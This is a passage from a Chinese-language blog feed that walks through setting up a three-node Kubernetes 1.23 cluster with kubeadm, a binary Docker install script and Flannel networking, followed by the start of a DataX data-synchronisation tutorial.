&lt;&lt;<span class="hljs-string">EOF &gt;/etc/apt/sources.list.d/kubernetes.list</span><br><span class="hljs-string">deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main</span><br><span class="hljs-string">EOF</span><br><br>2.获取最新软件包信息<br>apt-get update<br><br>3.查看一下当前环境支持的k8s版本<br>[root@master231 ~]# apt-cache madison kubeadm<br>   kubeadm |  1.28.2-00 | https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial/main amd64 Packages<br>   kubeadm |  1.28.1-00 | https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial/main amd64 Packages<br>   kubeadm |  1.28.0-00 | https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial/main amd64 Packages<br>   <br>4.安装 kubelet kubeadm kubectl<br>apt-get -y install kubelet=1.23.17-00 kubeadm=1.23.17-00 kubectl=1.23.17-00<br><br><br>5.所有节点都要检查各组件版本 <br>kubeadm version<br>kubectl version<br>kubelet --version<br></code></pre></td></tr></table></figure><h5 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.编写docker安装脚本<br>[root@master231 docker]# <span class="hljs-built_in">cat</span> install-docker.sh <br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># auther: cherry</span><br><br><span class="hljs-comment"># 加载操作系统的变量，主要是ID变量。</span><br>. /etc/os-release<br><br><span class="hljs-comment"># DOCKER_VERSION=26.1.1</span><br>DOCKER_VERSION=20.10.24<br><span class="hljs-comment"># DOCKER_COMPOSE_VERSION=2.27.0</span><br>DOCKER_COMPOSE_VERSION=2.23.0<br>FILENAME=docker-<span class="hljs-variable">$&#123;DOCKER_VERSION&#125;</span>.tgz<br>DOCKER_COMPOSE_FILE=docker-compose-v<span class="hljs-variable">$&#123;DOCKER_COMPOSE_VERSION&#125;</span><br>URL=https://download.docker.com/linux/static/stable/x86_64<br>DOCKER_COMPOSE_URL=https://github.com/docker/compose/releases/download/v<span class="hljs-variable">$&#123;DOCKER_COMPOSE_VERSION&#125;</span>/docker-compose-linux-x86_64<br>DOWNLOAD=./download<br>BASE_DIR=/softwares<br>OS_VERSION=<span class="hljs-variable">$ID</span><br><br><br><br><br><span class="hljs-comment"># 判断是否下载了docker-compose</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">prepare</span></span>()&#123;<br>   <span class="hljs-comment"># 判断是否下载docker-compose文件</span><br>   <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;DOCKER_COMPOSE_FILE&#125;</span> ]; <span class="hljs-keyword">then</span><br>      wget -T 3  -t 2 <span class="hljs-variable">$&#123;DOCKER_COMPOSE_URL&#125;</span> -O <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;DOCKER_COMPOSE_FILE&#125;</span><br>   <span class="hljs-keyword">fi</span><br>   <br>   <span class="hljs-keyword">if</span> [ $? != 0 ];<span class="hljs-keyword">then</span><br>     <span class="hljs-built_in">rm</span> -f <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;DOCKER_COMPOSE_FILE&#125;</span><br>     <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;不好意思，由于网络波动原因，无法下载<span class="hljs-variable">$&#123;DOCKER_COMPOSE_URL&#125;</span>软件包，程序已退出!请稍后再试......&quot;</span><br>     <span class="hljs-built_in">exit</span> 100<br>   <span class="hljs-keyword">fi</span><br><br>   <span class="hljs-comment"># 给脚本添加执行权限</span><br>   <span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;DOCKER_COMPOSE_FILE&#125;</span><br>&#125;<br><br><br><span class="hljs-comment"># 定义安装函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">InstallDocker</span></span>()&#123;<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$OS_VERSION</span> == <span class="hljs-string">&quot;centos&quot;</span> ];<span class="hljs-keyword">then</span><br>  [ -f /usr/bin/wget ] || yum -y install wget<br>          rpm -qa |grep bash-completion || yum -y install bash-completion<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$OS_VERSION</span> == <span class="hljs-string">&quot;ubuntu&quot;</span> ];<span class="hljs-keyword">then</span><br>  [ -f /usr/bin/wget ] || apt -y install wget<br><span class="hljs-keyword">fi</span><br><br>    <span class="hljs-comment"># 判断文件是否存在，若不存在则下载软件包</span><br>    <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;FILENAME&#125;</span> ]; <span class="hljs-keyword">then</span><br>       wget <span class="hljs-variable">$&#123;URL&#125;</span>/<span class="hljs-variable">$&#123;FILENAME&#125;</span> -O <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;FILENAME&#125;</span><br>    <span class="hljs-keyword">fi</span><br>    <br>    <span class="hljs-comment"># 判断安装路径是否存在</span><br>    <span class="hljs-keyword">if</span> [ ! -d <span class="hljs-variable">$&#123;BASE_DIR&#125;</span> ]; <span class="hljs-keyword">then</span><br>      install -d <span class="hljs-variable">$&#123;BASE_DIR&#125;</span><br>    <span class="hljs-keyword">fi</span><br>    <br>    <span class="hljs-comment"># 解压软件包到安装目录</span><br>    tar xf <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;FILENAME&#125;</span> -C <span class="hljs-variable">$&#123;BASE_DIR&#125;</span><br> <br>    <span class="hljs-comment"># 安装docker-compose</span><br>    prepare<br>    <span class="hljs-built_in">cp</span> <span class="hljs-variable">$DOWNLOAD</span>/<span class="hljs-variable">$&#123;DOCKER_COMPOSE_FILE&#125;</span> <span class="hljs-variable">$&#123;BASE_DIR&#125;</span>/docker/docker-compose<br>   <br>    <span class="hljs-comment"># 创建软连接</span><br>    <span class="hljs-built_in">ln</span> -svf <span class="hljs-variable">$&#123;BASE_DIR&#125;</span>/docker/* /usr/bin/<br>    <br>    <span class="hljs-comment"># 自动补全功能</span><br>    <span class="hljs-built_in">cp</span> <span class="hljs-variable">$DOWNLOAD</span>/docker /usr/share/bash-completion/completions/docker<br>    <span class="hljs-built_in">source</span> /usr/share/bash-completion/completions/docker<br>    <br>    <span class="hljs-comment"># 配置镜像加速</span><br>    install -d /etc/docker<br>    <span class="hljs-built_in">cp</span> <span class="hljs-variable">$DOWNLOAD</span>/daemon.json /etc/docker/daemon.json<br>    <br>    <span class="hljs-comment"># 开机自启动脚本</span><br>    <span class="hljs-built_in">cp</span> download/docker.service /usr/lib/systemd/system/docker.service<br>    systemctl daemon-reload<br>    systemctl <span class="hljs-built_in">enable</span> --now docker<br>    docker version<br>    docker-compose version<br>    tput setaf 3<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装成功,欢迎使用cherry二进制docker安装脚本，欢迎下次使用!&quot;</span><br>    tput setaf 2<br>&#125;<br><br><br><span class="hljs-comment"># 卸载docker</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">UninstallDocker</span></span>()&#123;<br>  <span class="hljs-comment"># 停止docker服务</span><br>  systemctl <span class="hljs-built_in">disable</span> --now docker<br><br>  <span class="hljs-comment"># 卸载启动脚本</span><br>  <span class="hljs-built_in">rm</span> -f /usr/lib/systemd/system/docker.service<br><br>  <span class="hljs-comment"># 清空程序目录</span><br>  <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$&#123;BASE_DIR&#125;</span>/docker<br><br>  <span class="hljs-comment"># 清空数据目录</span><br>  <span class="hljs-built_in">rm</span> -rf /var/lib/&#123;docker,containerd&#125; <br><br>  <span class="hljs-comment"># 清除符号链接</span><br>  <span class="hljs-built_in">rm</span> -f /usr/bin/&#123;containerd,containerd-shim,containerd-shim-runc-v2,ctr,docker,dockerd,docker-init,docker-proxy,runc&#125;<br><br>  <span class="hljs-comment"># 使得终端变粉色</span><br>  tput setaf 5<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;卸载成功,欢迎再次使用cherry二进制docker安装脚本哟~&quot;</span><br>  tput setaf 7<br>&#125;<br><br><br><span class="hljs-comment"># 程序的入口函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">main</span></span>()&#123;<br>   <span class="hljs-comment"># 判断传递的参数</span><br>   <span class="hljs-keyword">case</span> <span class="hljs-variable">$1</span> <span class="hljs-keyword">in</span><br>     install|i)<br>      InstallDocker<br>      ;;<br>      remove|r)<br>      UninstallDocker<br>      ;;<br>     *)<br>       <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Invalid parameter, Usage: <span class="hljs-variable">$0</span> install|remove&quot;</span><br>       ;;<br>   <span class="hljs-keyword">esac</span><br>&#125;<br><br><span class="hljs-comment"># 向入口函数传参</span><br>main <span class="hljs-variable">$1</span> <br><br>[root@master231 docker]# ll<br>total 16<br>drwxr-xr-x 3 root root 4096 Dec 10 05:49 ./<br>drwx------ 6 root root 4096 Dec 10 05:49 ../<br>drwxr-xr-x 2 root root 4096 May  9  2024 download/<br>-rwxr-xr-x 1 root root 3497 Dec 10 05:49 install-docker.sh*<br><br>2.安装docker<br>[root@master231 docker]# ./install-docker.sh install<br><span class="hljs-string">&#x27;/usr/bin/containerd&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/containerd&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/containerd-shim&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/containerd-shim&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/containerd-shim-runc-v2&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/containerd-shim-runc-v2&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/ctr&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/ctr&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/docker&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/docker&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/docker-compose&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/docker-compose&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/dockerd&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/dockerd&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/docker-init&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/docker-init&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/docker-proxy&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/docker-proxy&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/runc&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/runc&#x27;</span><br>Created symlink /etc/systemd/system/multi-user.target.wants/docker.service → /lib/systemd/system/docker.service.<br>Client:<br> Version:           20.10.24<br> API version:       1.41<br> Go version:        go1.19.7<br> Git commit:        297e128<br> Built:             Tue Apr  4 18:17:06 2023<br> OS/Arch:           linux/amd64<br> Context:           default<br> Experimental:      <span class="hljs-literal">true</span><br><br>Server: Docker Engine - Community<br> Engine:<br>  Version:          20.10.24<br>  API version:      1.41 (minimum version 1.12)<br>  Go version:       go1.19.7<br>  Git commit:       5d6db84<br>  Built:            Tue Apr  4 18:23:02 2023<br>  OS/Arch:          linux/amd64<br>  Experimental:     <span class="hljs-literal">false</span><br> containerd:<br>  Version:          v1.6.20<br>  GitCommit:        2806fc1057397dbaeefbea0e4e17bddfbd388f38<br> runc:<br>  Version:          1.1.5<br>  GitCommit:        v1.1.5-0-gf19387a6<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:        de40ad0<br>Docker Compose version v2.23.0<br>安装成功,欢迎使用cherry二进制docker安装脚本，欢迎下次使用!<br></code></pre></td></tr></table></figure><h5 id="初始化master组件"><a href="#初始化master组件" class="headerlink" title="初始化master组件"></a>初始化master组件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.导入镜像<br>[root@master231 ~]# docker load -i master-1.23.17.tar.gz<br><br>2.使用kubeadm初始化master节点<br>[root@master231 ~]# kubeadm init --kubernetes-version=v1.23.17 --image-repository registry.aliyuncs.com/google_containers  --pod-network-cidr=10.100.0.0/16 --service-cidr=10.200.0.0/16  --service-dns-domain=cherry.com<br><span class="hljs-comment">#这个要记住，添加节点需要用</span><br>kubeadm <span class="hljs-built_in">join</span> 10.0.0.231:6443 --token lzphw7.kc4iu4k0mswnpy7h \<br>--discovery-token-ca-cert-hash sha256:298393d4dc931d6d13ec2ec1aedd4295bcd143a84e78dfc5a82ec7e53210d511<br>--------------------------------------------------<br><br>3.拷贝授权文件，用于管理K8S集群<br>[root@master231 ~]# <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/.kube<br>[root@master231 ~]# <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="hljs-variable">$HOME</span>/.kube/config<br>[root@master231 ~]# <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> $(<span class="hljs-built_in">id</span> -u):$(<span class="hljs-built_in">id</span> -g) <span class="hljs-variable">$HOME</span>/.kube/config<br><br>4.查看集群节点<br>[root@master231 ~]# kubectl get cs<br>Warning: v1 ComponentStatus is deprecated <span class="hljs-keyword">in</span> v1.19+<br>NAME                 STATUS    MESSAGE                         ERROR<br>scheduler            Healthy   ok                              <br>controller-manager   Healthy   ok                              <br>etcd-0               Healthy   &#123;<span class="hljs-string">&quot;health&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>,<span class="hljs-string">&quot;reason&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125; <br>[root@master231 ~]# <br>[root@master231 ~]# <br>[root@master231 ~]# kubectl get nodes<br>NAME        STATUS     ROLES                  AGE    VERSION<br>master231   NotReady   control-plane,master   117s   v1.23.1<br></code></pre></td></tr></table></figure><h5 id="部署worler组件，添加节点"><a href="#部署worler组件，添加节点" class="headerlink" title="部署worler组件，添加节点"></a>部署worler组件，添加节点</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.导入镜像<br>[root@worker232 ~]# docker load  -i slave-1.23.17.tar.gz<br>[root@worker233 ~]# docker load  -i slave-1.23.17.tar.gz<br><br>2.在worker节点输入刚刚的token<br>[root@worker232 ~]# kubeadm <span class="hljs-built_in">join</span> 10.0.0.231:6443 --token lzphw7.kc4iu4k0mswnpy7h \<br>--discovery-token-ca-cert-hash sha256:298393d4dc931d6d13ec2ec1aedd4295bcd143a84e78dfc5a82ec7e53210d511<br><br>[root@worker232 ~]# kubeadm <span class="hljs-built_in">join</span> 10.0.0.231:6443 --token lzphw7.kc4iu4k0mswnpy7h \<br>--discovery-token-ca-cert-hash sha256:298393d4dc931d6d13ec2ec1aedd4295bcd143a84e78dfc5a82ec7e53210d511<br><br>3.master节点检查集群的worker节点列表<br>[root@master231 ~]# kubectl get nodes<br>NAME        STATUS     ROLES                  AGE     VERSION<br>master231   NotReady   control-plane,master   13m     v1.23.17<br>worker232   NotReady   &lt;none&gt;                 3m19s   v1.23.17<br>worker233   NotReady   &lt;none&gt;                 2m3s    v1.23.17<br></code></pre></td></tr></table></figure><h5 id="部署CNI插件，打通网络"><a href="#部署CNI插件，打通网络" class="headerlink" title="部署CNI插件，打通网络"></a>部署CNI插件，打通网络</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.导入镜像<br>[root@master231 ~]# docker load  -i flannel-cni-plugin-v1.5.1.tar.gz<br>[root@master232 ~]# docker load  -i flannel-cni-plugin-v1.5.1.tar.gz<br>[root@master233 ~]# docker load  -i flannel-cni-plugin-v1.5.1.tar.gz<br><br>[root@worker231 ~]# docker load -i flannel.tar.gz<br>[root@worker232 ~]# docker load -i flannel.tar.gz<br>[root@worker233 ~]# docker load -i flannel.tar.gz<br><br><br>2.下载Flannel组件<br>[root@master231 ~]# wget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml<br><br>3.安装Flannel组件<br>[root@master231 ~]# kubectl apply -f kube-flannel.yml <br><br>4.查看版本，版本要一致不然会启动失败<br>[root@master231 ~]# grep image kube-flannel.yml<br><br>5.检查falnnel各组件是否安装成功<br>[root@master231 ~]# kubectl get pods -o wide -n kube-flannel <br>NAME                    READY   STATUS    RESTARTS   AGE   IP           NODE        NOMINATED NODE   READINESS GATES<br>kube-flannel-ds-ckkbk   1/1     Running   0          35s   10.0.0.233   worker233   &lt;none&gt;           &lt;none&gt;<br>kube-flannel-ds-kst7g   1/1     Running   0          35s   10.0.0.232   worker232   &lt;none&gt;           &lt;none&gt;<br>kube-flannel-ds-ljktm   1/1     Running   0          35s   10.0.0.231   master231   &lt;none&gt;           &lt;none&gt;<br><br>6.测试各节点组件<br>[root@master231 ~]# kubectl get nodes<br>NAME        STATUS   ROLES                  AGE   VERSION<br>master231   Ready    control-plane,master   37m   v1.23.17<br>worker232   Ready    &lt;none&gt;                 27m   v1.23.17<br>worker233   Ready    &lt;none&gt;                 26m   v1.23.17<br><br></code></pre></td></tr></table></figure><h3 id="五、安装kubectl工具自动补全功能"><a href="#五、安装kubectl工具自动补全功能" class="headerlink" title="五、安装kubectl工具自动补全功能"></a>五、安装kubectl工具自动补全功能</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.临时补全生效<br>apt -y install bash-completion<br><span class="hljs-built_in">source</span> /usr/share/bash-completion/bash_completion<br><span class="hljs-built_in">source</span> &lt;(kubectl completion bash)<br><br>2.永久补全生效需要写入环境变量<br>[root@master231 ~]# vim .bashrc <br>...<br><span class="hljs-built_in">source</span> &lt;(kubectl completion bash)<br><br></code></pre></td></tr></table></figure><h3 id="六、修改时区"><a href="#六、修改时区" class="headerlink" title="六、修改时区"></a>六、修改时区</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.修改时区<br>[root@master231 ~]# <span class="hljs-built_in">ln</span> -svf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime <br><br>2.验证<br>[root@master231 ~]# <span class="hljs-built_in">date</span> -R<br></code></pre></td></tr></table></figure><h3 id="七、k8s基础巡检"><a href="#七、k8s基础巡检" class="headerlink" title="七、k8s基础巡检"></a>七、k8s基础巡检</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.检查K8S集群的worker节点列表<br>[root@master231 ~]# kubectl get nodes <br><br>2.检查master组件<br>[root@master231 ~]# kubectl get cs<br><br>3.检查flannel网卡是否正常<br>[root@master231 ~]# kubectl get pods -o wide -n kube-flannel<br><br>4.检查各节点网卡<br>ifconfig <br><br>- 如果有节点没有cni0网卡，建议大家手动创建相应的网桥设备，但是注意网段要一致:<br>1.假设 master231的flannel.1是10.100.0.0网段。<br>ip <span class="hljs-built_in">link</span> add cni0 <span class="hljs-built_in">type</span> bridge<br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> dev cni0 up<br>ip addr add 10.100.0.1/24 dev cni0<br><br>2.假设 worker232的flannel.1是10.100.1.0网段。<br>ip <span class="hljs-built_in">link</span> add cni0 <span class="hljs-built_in">type</span> bridge<br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> dev cni0 up<br>ip addr add 10.100.1.1/24 dev cni0<br><br>3.假设 worker233的flannel.1是10.100.2.0网段。<br>ip <span class="hljs-built_in">link</span> add cni0 <span class="hljs-built_in">type</span> bridge<br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> dev cni0 up<br>ip addr add 10.100.2.1/24 dev cni0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cicd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cicd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>datax实现数据同步</title>
    <link href="/2025/04/15/datax%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/"/>
    <url>/2025/04/15/datax%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="datax介绍"><a href="#datax介绍" class="headerlink" title="datax介绍"></a>datax介绍</h3><p>DataX 是阿里云的离线数据同步工具，它通过 JDBC 连接 MySQL 数据库，发送 SQL 语句获取数据缓存在本地 JVM中，然后通过 Writer 线程将数据写入到表格存储的数据表中。</p><h3 id="部署datax"><a href="#部署datax" class="headerlink" title="部署datax"></a>部署datax</h3><p>1、下载datax</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://datax-opensource.oss-cn-hangzhou.aliyuncs.com/datax.tar.gz<br><br></code></pre></td></tr></table></figure><p>2、安装python 3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install python3<br></code></pre></td></tr></table></figure><p>3、安装jdk11，mysql（需要安装mysql5.7,mysql8需要配置兼容）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install openjdk-11-jre-headless openjdk-11-jdk-headless mysql-server<br></code></pre></td></tr></table></figure><p>4、配置jdk环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ksbl-sit ~]# vim .bashrc<br><span class="hljs-built_in">export</span> JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$JAVA_HOME</span>/bin:<span class="hljs-variable">$PATH</span><br><br>[root@ksbl-sit ~]# <span class="hljs-built_in">source</span> .bashrc<br></code></pre></td></tr></table></figure><p>6、安装datax可视化界面</p><p>安装datax-web（datax的可视化服务），需要输入数据库的ip（默认127.0.0.1，这个IP必须匹配&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf中的bind IP，否则没法查数据库）、mysql的用户名和密码。之后会自动创建一个dataxweb数据库，里面包含datax-web的用户名和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 